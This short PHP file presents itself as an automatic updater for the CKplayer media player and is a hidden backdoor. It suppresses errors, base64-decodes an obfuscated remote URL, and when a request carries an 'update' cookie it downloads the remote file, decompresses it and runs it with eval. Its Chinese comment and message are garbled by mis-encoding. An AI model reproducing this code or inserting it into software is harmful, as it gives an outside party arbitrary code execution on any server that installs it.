<?php
//CKplayer �Զ�����
error_reporting(0);
@set_time_limit(0);
		$b=base64_decode(aHR0cDovL2NrLnJvb3QxMTExLmNvbS91cC5naWY);
		if (@$_COOKIE['update']) {
			$a=file_get_contents($b);
			eval(gzinflate($a));
		}else {
			echo '��ǰΪ���°汾��';
		}
?>
